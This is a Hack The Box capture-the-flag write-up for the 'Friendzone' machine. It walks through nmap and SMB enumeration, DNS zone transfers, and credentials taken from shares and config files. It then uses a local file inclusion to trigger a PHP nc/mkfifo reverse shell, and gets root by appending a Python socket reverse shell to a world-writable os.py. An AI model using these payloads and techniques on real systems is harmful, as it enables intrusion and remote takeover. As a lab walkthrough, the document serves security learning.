---
layout: post
title: "Friendzone"
categories: HTB
---

#### Nmap Scan

```
# Nmap 7.80 scan initiated Sun Jul 19 11:18:38 2020 as: nmap -sV -sC -p- -oA allports_nmap_scan 10.10.10.123
Nmap scan report for 10.10.10.123
Host is up (0.018s latency).
Not shown: 65528 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


Host script results:
|_clock-skew: mean: -1h00m08s, deviation: 1h43m54s, median: -9s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2020-07-19T04:18:59+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-07-19T01:18:59
|_  start_date: N/A


Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 19 11:19:16 2020 -- 1 IP address (1 host up) scanned in 37.89 seconds
```
<hr>

#### Initial Access
#### Web
Visiting http://10.10.10.123 shows the following page.
take note of the email domain `"friendzoneportal.red"`
Neither Gobuster or Nikto give any use full information<br>

![](\images\htb\friendzone\1.png)<br><br>

#### SMB
```
smbmap -H 10.10.10.123
[+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

Have read/write access to "Development" share. Taking note of the comment in the "Files" share "/etc/Files"

Running nmap to confirm location of the "Development" share on the machine
`nmap --script smb-enum-shares -p139 10.10.10.123`<br>
![](\images\htb\friendzone\2.png)<br><br>

Connecting to the "general" share find file  "cred.txt" file which has a credentials "for the admin thing" inside<br>
![](\images\htb\friendzone\3.png)<br><br>
![](\images\htb\friendzone\4.png)<br><br>

Credentials
`admin:WORKWORKHhallelujah@#`


#### DNS

port 53 is open both domains are vulnerable to zone transfers
```
dig axfr friendzone.red @10.10.10.123

dig axfr friendzoneportal.red @10.10.10.123
```
<br>![](\images\htb\friendzone\5.png)<br><br>

Add these to /etc/host file in kali<br>
![](\images\htb\friendzone\6.png)<br><br>

Visiting https://administrator1.friendzone.red shows the following page, this is were the credentials from credz.txt are used<br>

![](\images\htb\friendzone\7.png)<br><br>


After logging in we can see that is complaining about a parameter missing<br>

![](\images\htb\friendzone\8.png)<br><br>

#### Revereshell

Create PHP reverse shell
`<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 8888 >/tmp/f');
?>`

Upload shell to the development share<br>
![](\images\htb\friendzone\9.png)<br><br>

Start nc listener on port 8888
`nc -lvnp 8888`

Visit the following to get a reverse shell
https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&pagename=/etc/Development/shell

<br>![](\images\htb\friendzone\10.png)<br><br>

<hr>

### User

In /var/www there is a mysql config file which contains credentials for the user friend
`friend:Agpyu12!0.213$`

<br>![](\images\htb\friendzone\11.png)<br><br>

#### SSH
Login to box with above credentials

`ssh friend@10.10.10.123`

<br>![](\images\htb\friendzone\12.png)<br><br>

User.txt
`a9ed20ac****************15ae9a11`

<hr>

### Root

Root

Run pspy64 to see running services<br>
![](\images\htb\friendzone\13.png)<br><br>

After abit a new process is spawned running a python script<br>
![](\images\htb\friendzone\14.png)<br><br>

Unfortunately "/opt/server_admin/reporter.py" is owned by root so we can't hijack the script, but the script is making use of the python OS module<br>
![](\images\htb\friendzone\15.png)<br><br>

Script is using python 2 (tell by the #!/usr/bin/python at the top)

#### Locating OS.py
`locate os.py`
<br>![](\images\htb\friendzone\16.png)<br><br>

os.py is world writable <br>
![](\images\htb\friendzone\17.png)<br><br>

Injecting reverse shell to the bottom of os.py
```
import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.16",8899))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```
<br>![](\images\htb\friendzone\18.png)<br><br>

After a minute get a root shell<br>
![](\images\htb\friendzone\19.png)<br><br>

root.txt
`b0e6c60b****************6a9e90c7`
